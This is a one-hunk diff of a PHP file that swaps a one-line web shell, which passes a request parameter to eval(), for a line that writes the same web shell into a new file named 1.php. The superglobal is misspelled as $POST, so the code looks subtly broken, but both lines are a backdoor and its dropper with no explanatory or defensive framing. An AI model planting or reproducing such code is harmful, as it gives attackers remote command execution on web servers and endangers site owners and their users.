@@ -1,1 +1,1 @@
-<?php eval($POST['cmd']);?>
+<?php echo file_put_contents('1.php', "<?php eval($POST['cmd']);?>" );?>
